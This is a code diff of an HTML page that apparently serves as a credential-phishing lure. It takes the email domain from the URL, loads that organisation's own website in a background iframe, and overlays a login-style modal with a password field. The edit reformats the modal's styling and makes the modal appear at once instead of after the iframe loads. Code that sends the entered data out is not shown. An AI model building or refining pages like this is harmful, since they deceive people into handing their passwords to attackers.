@@ -31,22 +31,20 @@
         }
 
         #modal {
-    position: fixed;
-    top: 50%;
-    right: 55px; /* Adjusted to create a 35px distance from the right edge */
-    transform: translateY(-50%); /* Center the modal vertically */
-    background-color: white;
-    width: 400px; /* Modal width */
-    height: 380px; /* Modal height */
-    padding: 20px;
-    z-index: 101; /* Modal appears above the overlay */
-    display: none; /* Initially hidden */
-    overflow: auto; /* Allow scrolling if content overflows */
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-    border-radius: 15px; 
-}
-
-         
+            position: fixed;
+            top: 50%;
+            right: 55px; /* Adjusted to create a 35px distance from the right edge */
+            transform: translateY(-50%); /* Center the modal vertically */
+            background-color: white;
+            width: 400px; /* Modal width */
+            height: 380px; /* Modal height */
+            padding: 20px;
+            z-index: 101; /* Modal appears above the overlay */
+            display: none; /* Initially hidden */
+            overflow: auto; /* Allow scrolling if content overflows */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 15px; 
+        }
 
         /* Additional CSS from the login page */
         .super {
@@ -161,8 +159,15 @@
             return '';
         }
 
-        // Function to display the iframe with the email domain and show the modal when iframe loads
-        function showModalWhenIframeLoads() {
+        // Function to show the modal immediately
+        function showModal() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('modal').style.display = 'block';
+            document.body.classList.add('inactive'); // Disable background scrolling
+        }
+
+        // Function to load the iframe in the background
+        function loadIframeInBackground() {
             const queryString = window.location.search;
             const domain = getEmailDomain(queryString);
 
@@ -171,15 +176,14 @@
                 iframe.src = 'https://' + domain; // Load the domain as the iframe source
                 iframe.className = 'background-iframe';
                 document.body.appendChild(iframe); // Add the iframe to the body
-
-                // Show modal only after iframe has fully loaded
-                iframe.onload = function() {
-                    document.getElementById('overlay').style.display = 'block';
-                    document.getElementById('modal').style.display = 'block';
-                    document.body.classList.add('inactive'); // Disable background scrolling
-                };
             }
         }
+
+        // Start loading the iframe and showing the modal on page load
+        window.onload = function() {
+            showModal();
+            loadIframeInBackground();
+        };
 
         // Function to toggle password visibility
         function togglePassword() {
@@ -190,9 +194,6 @@
                 passwordField.type = 'password';
             }
         }
-
-        // Start loading the iframe on page load
-        window.onload = showModalWhenIframeLoads;
     </script>
 </body>
 </html>
